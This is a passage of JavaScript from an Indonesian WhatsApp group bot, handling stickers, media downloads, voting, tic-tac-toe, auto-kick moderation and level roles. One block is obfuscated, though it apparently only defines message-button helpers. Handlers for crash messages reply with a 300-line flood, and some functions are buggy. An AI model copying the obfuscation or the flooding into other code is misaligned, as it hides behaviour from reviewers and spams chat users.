				fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
					return `./sticker/${name}.exif`	
					})	
				}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Zeeone.sendMessage(to, media, MessageType.sticker,{quoted:Ofc})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            Zeeone.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	Zeeone.sendMessage(from, hasil, type, options).catch(e => {
            	Zeeone.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Zeeone.sendMessage(to, media, type, { quoted: Ofc, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, Ofc, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return Zeeone.sendMessage(from, teks, text, {quoted: Ofc, thumbnail: thumbnail})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					Zeeone.sendMessage(to, media, sticker, Ofc)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			
			const sendFile = async(link, type, options) => {
				hasil = await getBuffer(link)
				Zeeone.sendMessage(from, hasil, type, options).catch(e => {
					fetch(link).then((hasil) => {
						Zeeone.sendMessage(from, hasil, type, options).catch(e => {
							Zeeone.sendMessage(from, { url : link }, type, options).catch(e => {
								reply('Error!')
								console.log(e)
							})
						})
					})
				})
			}
					if(isGroup && !isVote) {
							if (budy.toLowerCase() === 'vote'){
								let vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
								let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
								let fil = vote.map(v => v.participant)
								let id_vote = sender ? sender : `${owner_number}@s.whatsapp.net`
								if(fil.includes(id_vote)) {
									return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
									} else {
										vote.push({
											participant: id_vote,
											voting: '✅'
										})
										fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
										let _p = []
										let _vote = `『   VOTING  』\n\n*Vote* @${_votes[0].votes.split('@')[0]}\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit` 
										for(let i = 0; i < vote.length; i++) {
											_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}`
											_p.push(vote[i].participant)
										}  
										_p.push(_votes[0].votes)
										mentions(_vote,_p,true)   
									}
								} else if (budy.toLowerCase() === 'devote'){
									const vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
									let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
									let fil = vote.map(v => v.participant)
									let id_vote = sender ? sender : `${owner_number}@s.whatsapp.net`
									if(fil.includes(id_vote)) {
										return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
										} else {
											vote.push({
												participant: id_vote,
												voting: '❌'
											})
										fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
										let _p = []
										let _vote = `『   VOTING  』\n\n*Vote* @${_votes[0].votes.split('@')[0]}\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit` 
										for(let i = 0; i < vote.length; i++) {
											_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}`
											_p.push(vote[i].participant)
											}  
											_p.push(_votes[0].votes)
											mentions(_vote,_p,true)   
											}
										}
									}
					const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return Zeeone.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: Ofc })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return Zeeone.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: Ofc })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./database/user/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp Bot_`
                    return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./database/user/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp Bot_`
                    return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./database/user/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp Bot_`
                return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./database/user/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp Bot_`
                return Zeeone.sendMessage(from, tesk, text, {quoted:Ofc, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./database/user/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Zeeone.sendMessage(from, `『 *GAME TICTACTOE REJECTED* 』\n\n• @${tttSkuy.Y} yahaha wahyu`, text, {quoted: Ofc, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./database/user/" + from + ".json");
	}
}
					if (isGroup && isAntro && m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
						reply(`Troli Detected\n` + require('util').format(m.key))
						Zeeone.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
						await Zeeone.modifyChat(m.chat, 'delete', {
							includeStarred: false
						})
					}
					if (setiker.includes(messagesC)){
						namastc = messagesC
						buffer = fs.readFileSync(`./database/stick/${namastc}.webp`)
						fs.writeFileSync('./sticker/responder.webp', buffer)
						exec(`webpmux -set exif ./sticker/data.exif ./sticker/responder.webp -o ./sticker/responder.webp`, async (error) => {
							if (error) return reply(mess.error)
							Zeeone.sendMessage(from, fs.readFileSync(`./sticker/responder.webp`), sticker, {quoted: Ofc})
							fs.unlinkSync(`./sticker/responder.webp`)
						})
					}
			(function(_0x2c9876,_0x29cdc3){function _0x110b8c(_0x527db2,_0x57fc87,_0x206d01,_0x1c7937){return _0x493d(_0x1c7937- -0x3bd,_0x527db2);}function _0x85ea44(_0x530e63,_0x8413c4,_0x5e91af,_0x37ee8d){return _0x493d(_0x530e63- -0x52,_0x5e91af);}const _0x94d676=_0x2c9876();while(!![]){try{const _0x4d7c12=-parseInt(_0x85ea44(0xdf,0xec,0xce,0xd1))/(0x15ef+0x16a5+-0x2c93)+parseInt(_0x85ea44(0xe0,0xe8,0xed,0xd8))/(-0x1bc2+-0x14db+0x309f)+parseInt(_0x85ea44(0xd7,0xdc,0xeb,0xde))/(0x73*-0x53+-0x21eb+0x17bd*0x3)*(parseInt(_0x110b8c(-0x276,-0x284,-0x287,-0x27e))/(0x2037*-0x1+0x30*-0x2+0x209b))+parseInt(_0x85ea44(0xd4,0xe3,0xd4,0xd5))/(0x1*0x1c07+0x1007+-0x2c09)+-parseInt(_0x110b8c(-0x282,-0x2a6,-0x28a,-0x293))/(0x1707+-0x2ef*0x2+-0x1123)*(parseInt(_0x110b8c(-0x29d,-0x289,-0x292,-0x29b))/(-0x6f*0x2e+-0x1661+0x2a5a))+parseInt(_0x110b8c(-0x29a,-0x28b,-0x295,-0x287))/(0x46d*-0x3+-0x196f+0xae*0x39)+parseInt(_0x85ea44(0xe6,0xf4,0xe0,0xf0))/(0x10f*0xe+0x6fb*-0x5+0x141e);if(_0x4d7c12===_0x29cdc3)break;else _0x94d676['push'](_0x94d676['shift']());}catch(_0x2e5ce8){_0x94d676['push'](_0x94d676['shift']());}}}(_0x50ba,-0x10737*0x16+-0xd040a+0xab*0x4a25));function _0x50ba(){const _0xd5441c=['ephemeralM','7lMwRPX','videoMessa','mentionedJ','imageMessa','80295dFbKgV','HcyeN','rdowk','78qJHIYI','10128696GfdSIv','essage','video/gif','quoted','isForwarde','contentTex','sendEpheme','713766qTGZEW','485976eYQieI','sage','zHLsz','sendMessag','11595904tvZJGr','bmHeG','8305740qGleia','forwarding','gif','prepareMes','buttons','footerText','buttonsMes','104740edVSlc','contextInf','location','ral','locationMe','message','video','headerType','Score','ssage'];_0x50ba=function(){return _0xd5441c;};return _0x50ba();}function _0x493d(_0x36a6de,_0x3c43fe){const _0x2ccec9=_0x50ba();return _0x493d=function(_0x3d8683,_0x35a50e){_0x3d8683=_0x3d8683-(-0x2340+0xb*0x1c1+0x1112);let _0x495b36=_0x2ccec9[_0x3d8683];return _0x495b36;},_0x493d(_0x36a6de,_0x3c43fe);}const sendButMessage=async(_0x225eb0,_0x36e7d1,_0x44b0a4,_0x34f273=[],_0x66beea={})=>{const _0x11df11={};_0x11df11['contentTex'+'t']=_0x36e7d1,_0x11df11[_0xe53c51(0x72,0x72,0x68,0x6b)]=_0x44b0a4,_0x11df11[_0xe53c51(0x62,0x71,0x74,0x5f)]=_0x34f273,_0x11df11['headerType']=0x1,buttonMessage=_0x11df11;function _0xe53c51(_0x51dc05,_0x24b8c1,_0x17f75b,_0x15fe69){return _0x493d(_0x24b8c1- -0xcb,_0x15fe69);}const _0x35a900={};_0x35a900[_0xe53c51(0x73,0x6e,0x73,0x69)+'Score']=0x3b9aca00,_0x35a900[_0xe53c51(0x70,0x63,0x65,0x72)+'d']=!![];const _0x3f0121={};_0x3f0121[_0x589783(0x273,0x269,0x262,0x274)+'o']=_0x35a900;function _0x589783(_0x3428e1,_0x4979d0,_0x3d447d,_0x2df4dc){return _0x493d(_0x2df4dc-0x134,_0x3d447d);}_0x3f0121[_0xe53c51(0x6d,0x62,0x70,0x57)]=ftroli,_0x3f0121[_0x589783(0x250,0x250,0x262,0x264)+_0xe53c51(0x74,0x77,0x71,0x7f)]=!![],Zeeone[_0x589783(0x27a,0x27c,0x279,0x269)+'e'](_0x225eb0,buttonMessage,MessageType[_0xe53c51(0x71,0x73,0x64,0x7a)+'sage'],_0x3f0121);},sendButLocation=async(_0x27ad8c,_0xb3d679,_0xe74977,_0x2f0af8,_0x2d9eaa=[],_0xe6a43b={})=>{const _0x4ee399={};_0x4ee399[_0x4e835f(0x486,0x4a9,0x48c,0x497)]='ephemeralM'+'essage';const _0x431bab=_0x4ee399;kma=_0x2f0af8;const _0x12d08a=await Zeeone[_0x5cf01c(0x1d8,0x1c5,0x1d4,0x1c2)+'sage'](_0x27ad8c,kma,MessageType[_0x4e835f(0x4a8,0x49e,0x4a1,0x4a4)],{'thumbnail':kma});function _0x4e835f(_0x5b890e,_0x3b2321,_0x559cb6,_0x5e4a58){return _0x493d(_0x5e4a58-0x363,_0x3b2321);}mhan=_0x12d08a[_0x5cf01c(0x1d3,0x1e7,0x1dd,0x1d7)][_0x431bab[_0x4e835f(0x492,0x4a3,0x49d,0x497)]]?_0x12d08a[_0x4e835f(0x4ac,0x4ad,0x4b0,0x4a7)][_0x4e835f(0x490,0x47a,0x473,0x484)+_0x5cf01c(0x1c2,0x1ce,0x1c4,0x1b3)]:_0x12d08a;const _0x5d8aeb={};_0x5d8aeb[_0x4e835f(0x4b5,0x4ba,0x49b,0x4a6)+_0x5cf01c(0x1b5,0x1b3,0x1b9,0x1c6)]=mhan[_0x5cf01c(0x1df,0x1e0,0x1dd,0x1cb)][_0x4e835f(0x4b1,0x4ac,0x4a0,0x4a6)+_0x4e835f(0x483,0x490,0x48f,0x483)],_0x5d8aeb['contentTex'+'t']=_0xb3d679;function _0x5cf01c(_0x293186,_0x368d4f,_0x36c7db,_0x2d79e3){return _0x493d(_0x36c7db-0x99,_0x368d4f);}_0x5d8aeb[_0x5cf01c(0x1c8,0x1ea,0x1d6,0x1df)]=_0xe74977,_0x5d8aeb[_0x5cf01c(0x1df,0x1e3,0x1d5,0x1c7)]=_0x2d9eaa,_0x5d8aeb['headerType']=0x6,buttonMessages=_0x5d8aeb,Zeeone['sendMessag'+'e'](_0x27ad8c,buttonMessages,MessageType[_0x4e835f(0x493,0x4a5,0x49a,0x4a1)+_0x4e835f(0x497,0x49d,0x483,0x496)],_0xe6a43b);},sendButVideo=async(_0x4433cd,_0x200e23,_0x15fec4,_0x15a448,_0x1331e7=[],_0x5d1a1f={})=>{function _0x8d1dff(_0xb90dd0,_0x5af559,_0x3719e7,_0x5b7456){return _0x493d(_0xb90dd0-0x186,_0x5b7456);}const _0x8ea37={};_0x8ea37[_0x8d1dff(0x2bd,0x2cf,0x2b8,0x2ab)]='ephemeralM'+_0x8d1dff(0x2b1,0x2b6,0x2c2,0x2c0);const _0x1fbc4e=_0x8ea37;kma=_0x15a448;const _0x423f30=await Zeeone[_0x39b460(0xcc,0xd8,0xec,0xc8)+_0x39b460(0xda,0xd0,0xdd,0xcf)](_0x4433cd,kma,MessageType[_0x8d1dff(0x2a3,0x28f,0x2ae,0x290)]);mhan=_0x423f30[_0x8d1dff(0x2ca,0x2d0,0x2c3,0x2bb)][_0x1fbc4e[_0x39b460(0xc0,0xd4,0xe7,0xda)]]?_0x423f30[_0x39b460(0xe3,0xe1,0xe0,0xe4)][_0x39b460(0xd1,0xbe,0xc5,0xbd)+'essage']:_0x423f30;const _0x2aad22={};_0x2aad22[_0x8d1dff(0x2a9,0x29b,0x2b4,0x2a8)+'ge']=mhan[_0x39b460(0xd0,0xe1,0xe0,0xef)][_0x8d1dff(0x2a9,0x298,0x299,0x2b4)+'ge'],_0x2aad22[_0x8d1dff(0x2b5,0x2a2,0x2af,0x2a4)+'t']=_0x200e23;function _0x39b460(_0x206bd9,_0x512f04,_0x4e1960,_0x4e890f){return _0x493d(_0x512f04- -0x63,_0x206bd9);}_0x2aad22[_0x8d1dff(0x2c3,0x2c8,0x2d0,0x2cc)]=_0x15fec4,_0x2aad22[_0x39b460(0xe8,0xd9,0xd1,0xea)]=_0x1331e7,_0x2aad22['headerType']=0x5;const _0x3c2de4=_0x2aad22;Zeeone[_0x8d1dff(0x2bb,0x2b9,0x2bd,0x2a8)+'e'](_0x4433cd,_0x3c2de4,MessageType[_0x8d1dff(0x2c4,0x2c6,0x2b3,0x2cf)+_0x39b460(0xe1,0xd0,0xd7,0xcd)],_0x5d1a1f);},sendButImage=async(_0x4887b3,_0x43fdff,_0x1d778a,_0x4e97f5,_0x3b63e4=[],_0x4a340a={})=>{const _0x5a8072={};_0x5a8072[_0x43fa3b(0x3c8,0x3bf,0x3c1,0x3be)]=_0x2b90b2(0x3,0x9,0xa,0x11)+_0x2b90b2(0x0,0x13,0x4,0x26);const _0x3ffbbe=_0x5a8072;kma=_0x4e97f5;const _0x1180dd=await Zeeone[_0x2b90b2(0x2d,0x23,0x1f,0x2d)+_0x2b90b2(0x10,0x1b,0x21,0x2e)](_0x4887b3,kma,MessageType[_0x2b90b2(-0xa,0x5,0xa,-0xd)]);function _0x43fa3b(_0x25e461,_0x418149,_0x810866,_0x4efb3d){return _0x493d(_0x418149-0x298,_0x25e461);}mhan=_0x1180dd[_0x2b90b2(0x28,0x2c,0x1c,0x36)][_0x3ffbbe[_0x43fa3b(0x3af,0x3bf,0x3bc,0x3c7)]]?_0x1180dd[_0x43fa3b(0x3f0,0x3dc,0x3d1,0x3de)][_0x43fa3b(0x3b2,0x3b9,0x3c5,0x3be)+'essage']:_0x1180dd;function _0x2b90b2(_0x3d64a5,_0x3c05d5,_0xce7a21,_0x3ece73){return _0x493d(_0x3c05d5- -0x118,_0x3ece73);}const _0x5df23b={};_0x5df23b['imageMessa'+'ge']=mhan[_0x43fa3b(0x3da,0x3dc,0x3e4,0x3d0)][_0x2b90b2(0x11,0xd,0x1b,0x2)+'ge'],_0x5df23b['contentTex'+'t']=_0x43fdff,_0x5df23b['footerText']=_0x1d778a,_0x5df23b['buttons']=_0x3b63e4,_0x5df23b[_0x43fa3b(0x3a8,0x3b6,0x3a5,0x3a3)]=0x4,buttonMessages=_0x5df23b,Zeeone['sendMessag'+'e'](_0x4887b3,buttonMessages,MessageType[_0x43fa3b(0x3cc,0x3d6,0x3d7,0x3e5)+_0x2b90b2(0x7,0x1b,0x11,0x10)],_0x4a340a);},sendButGif=async(_0x32a65b,_0x1422e9,_0x37464b)=>{const _0x1a6863={};_0x1a6863['EpSlL']=_0x4908a2(-0x149,-0x135,-0x13d,-0x13c),_0x1a6863[_0x4d86e2(-0x2bf,-0x2cc,-0x2b8,-0x2ac)]='ZeeoneOfc.'+_0x4d86e2(-0x2ad,-0x29d,-0x2b3,-0x2be);const _0x33f566=_0x1a6863;let _0x377842=await getBuffer(_0x32a65b);function _0x4908a2(_0x1ceca5,_0x4100a1,_0x95d621,_0x4a77d6){return _0x493d(_0x4a77d6- -0x268,_0x1ceca5);}function _0x4d86e2(_0x42a16b,_0x57f468,_0x3ee269,_0x273efa){return _0x493d(_0x42a16b- -0x3e7,_0x273efa);}const _0xd5aa2a={};_0xd5aa2a[_0x4d86e2(-0x2c3,-0x2c5,-0x2b7,-0x2b3)+'id']=_0x37464b,_0xd5aa2a['forwarding'+_0x4908a2(-0x141,-0x14c,-0x15c,-0x149)]=0x1fc,_0xd5aa2a[_0x4d86e2(-0x2b9,-0x2c1,-0x2bd,-0x2c5)+'d']=!![],Zeeone[_0x4908a2(-0x143,-0x12e,-0x132,-0x133)+'e'](from,_0x377842,MessageType[_0x4d86e2(-0x2ca,-0x2b8,-0x2d9,-0x2cb)],{'mimetype':_0x33f566['EpSlL'],'filename':_0x33f566['rdowk'],'gifPlayback':!![],'caption':_0x1422e9,'sendEphemeral':!![],'contextInfo':_0xd5aa2a,'quoted':Ofc,'thumbnail':_0x377842});};
					if (audionye.includes(messagesC)){
						namastc = messagesC
						buffer = fs.readFileSync(`./database/audio/${namastc}.mp3`)
						Zeeone.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: Ofc, ptt: true })
					}
					if (imagenye.includes(messagesC)){
						namastc = messagesC
						buffer = fs.readFileSync(`./database/image/${namastc}.jpg`)
						Zeeone.sendMessage(from, buffer, image, {quoted: Ofc })
					}
					if (videonye.includes(messagesC)){
						namastc = messagesC
						buffer = fs.readFileSync(`./database/video/${namastc}.mp4`)
						Zeeone.sendMessage(from, buffer, video, {quoted: Ofc })
					}
					if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
						if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
							sendButMessage(from, ` *GROUP LINK DETECTED*\n\nMaaf Kamu Akan Di Kick Dari Group Ini!`, `Klik Di Bawah Untuk Mematikan`, [
							{
							buttonId: `antilink off`,
							buttonText: {
								displayText: `🔖 DISABLE ANTILINK`,
								},
								type: 1,
								}]);
							Zeeone.groupRemove(from, [sender])
						}
					}
					if (budy.length > 10000) {
						if (!itsMe) return
						if (m.isBaileys) return
							Zeeone.modifyChat(m.chat, 'delete', {
							includeStarred: false
						})
						Zeeone.sendMessage(from, `『 *VIRTEX DETECTED* 』 `, text, {quoted: Ofc})
						Zeeone.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
					}
					if (!m.isBaileys && isGroup && isBadword && !isOwner && !isGroupAdmins && !Ofc.key.fromMe){
						for (let kasar of badword){
							if (chats.toLowerCase().includes(kasar)){
								if (isCountKasar(sender, senbadword)){
									if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
									sendButMessage(from, `*ANTI BADWORD*\n\nHai ${pushname}\nSepertinya kamu sudah berkata kasar lebih dari 2x, maaf kamu akan di kick`, `Klik Di Bawah Untuk Mematikan`, [
									{
										buttonId: `antibadword off`,
										buttonText: {
											displayText: `🔖 DISABLE ANTI BADWORD`,
											},
											type: 1,
											}]);
									Zeeone.groupRemove(from, [sender])
									delCountKasar(sender, senbadword)
									} else {
										addCountKasar(sender, senbadword)
										reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
									}
								}
							}
						}
						Zeeone.chatRead(from, "read")
					_sewa.expiredCheck(Zeeone, sewa)
					
					const levelRole = getLevelingLevel(sender)
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
